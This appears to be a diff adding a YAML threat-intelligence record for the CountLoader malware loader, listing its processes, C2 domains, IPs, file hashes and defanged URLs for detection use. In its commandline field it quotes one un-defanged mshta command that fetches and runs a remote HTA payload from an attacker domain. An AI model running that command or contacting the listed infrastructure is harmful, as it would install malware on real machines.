@@ -1,0 +1,87 @@
+description: CountLoader is a loader that stages malware in the Windows Music folder
+  and communicates with multiple C2 domains, including app-updater.app, quasuar.com,
+  misctoolsupdate.com, and others.
+attribution: Unknown threat actor; possible Russian or Eastern European origin.
+malware_families:
+- CountLoader
+TTPs:
+  processes:
+  - mshta.exe
+  - wscript.shell
+  - winhttp.winhttprequest.5.1
+  commandline:
+  - mshta \"https://ms-team-ping.com/api/getFile/ENV.hta/start\"
+  powershell: []
+  scripting_engine:
+  - JavaScript (embedded in the archive)
+  registry_keys:
+  - HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Styles\\
+  image_load: []
+  network_connections:
+  - executable: ''
+    destination: app-updater.app
+  - executable: ''
+    destination: quasuar.com
+  - executable: ''
+    destination: misctoolsupdate.com
+  - executable: ''
+    destination: grouptelecoms.com
+  - executable: ''
+    destination: limenlinon.com
+  - executable: ''
+    destination: officetoolservices.com
+  - executable: ''
+    destination: onlinenetworkupdate.com
+  - process: mshta.exe
+    destination: https://ms-team-ping.com
+    port: 443
+  - process: winhttp.winhttprequest.5.1
+    destination: 64.137.9.118
+    port: 80
+  file_activity:
+  - path: file2.exe
+    sha256: 233C777937F3B0F83B1F6AE47403E03D1C3F72F650B4C6AE3FACEC7F2E5DA4B5
+  - path: file.exe
+    sha256: 5e9647e36d2fb46f359036381865efb0e432ff252fae138682cb2da060672c84
+  - path: file_x64.exe
+    sha256: 8A286A315DBA36B13E61B6A3458A4BB3ACB7818F1E957E0892A35ABB37FC9FCE
+  - path: run_v2.exe
+    sha256: EA410874356E7D27867A4E423F1A818AAEA495DFBF068243745C27B80DA84FAE
+  - path: run_v4.exe
+    sha256: B86ADCF7B5B8A6E01C48D2C84722919DF2D1C613410C32EB43FC8C10B8158C45
+  - path: cvcshost.exe
+    sha256: D34CA886266B7CE5F75F4CAAA6E48F61E194BB55605C2BC4032BA8AF5580B2E7
+  persistence: []
+  process_relations: []
+IOCs:
+  hashes:
+  - 233C777937F3B0F83B1F6AE47403E03D1C3F72F650B4C6AE3FACEC7F2E5DA4B5
+  - 5e9647e36d2fb46f359036381865efb0e432ff252fae138682cb2da060672c84
+  - 8A286A315DBA36B13E61B6A3458A4BB3ACB7818F1E957E0892A35ABB37FC9FCE
+  - EA410874356E7D27867A4E423F1A818AAEA495DFBF068243745C27B80DA84FAE
+  - B86ADCF7B5B8A6E01C48D2C84722919DF2D1C613410C32EB43FC8C10B8158C45
+  - D34CA886266B7CE5F75F4CAAA6E48F61E194BB55605C2BC4032BA8AF5580B2E7
+  ips:
+  - 64.137.9.118
+  - 109.176.30.246
+  - 45.61.150.76
+  - 180.131.145.73
+  domains:
+  - app-updater.app
+  - quasuar.com
+  - misctoolsupdate.com
+  - grouptelecoms.com
+  - limenlinon.com
+  - officetoolservices.com
+  - onlinenetworkupdate.com
+  urls:
+  - hxxp://64.137.9.118/__utm.gif
+  - hxxps://64.137.9.118/api
+  - hxxps://64.137.9.118/dpixel
+  - hxxps://chifacanton.phuyufact.com/images/sot/e/Xojwecqy.exe
+  - hxxps://chifacanton.phuyufact.com/images/sot/m/git.msi
+  - hxxps://gizqt.xyz
+  - hxxps://d31tef3bsujkft.cloudfront.net/safebrowsing/rd/CltOb12nLW1IbHehcmUtd2hUdmFzEBAY7-0KIOkUDC7h2
+reference: https://www.silentpush.com/blog/countloader
+date_of_publication: September 18, 2025
+file_creation_date: October 01, 2025
